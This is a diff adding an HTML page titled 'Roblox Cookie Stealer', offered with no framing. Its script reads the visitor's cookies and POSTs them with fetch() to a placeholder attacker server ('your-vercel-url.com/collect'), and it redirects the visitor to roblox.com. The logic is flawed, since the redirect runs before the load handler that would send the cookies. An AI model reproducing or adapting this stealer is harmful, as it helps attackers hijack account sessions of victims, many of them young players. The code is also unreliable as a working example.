@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Cookie Stealer</title>
+</head>
+<body>
+    <script>
+        // Redirect to Roblox
+        window.location.href = 'https://www.roblox.com';
+
+        // Function to send cookies to your server
+        function sendCookies() {
+            // Get all cookies
+            var cookies = document.cookie;
+            // Send cookies to your server
+            fetch('https://your-vercel-url.com/collect', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ cookies: cookies })
+            });
+        }
+
+        // Wait for the page to load and then send cookies
+        window.addEventListener('load', sendCookies);
+    </script>
+</body>
+</html>
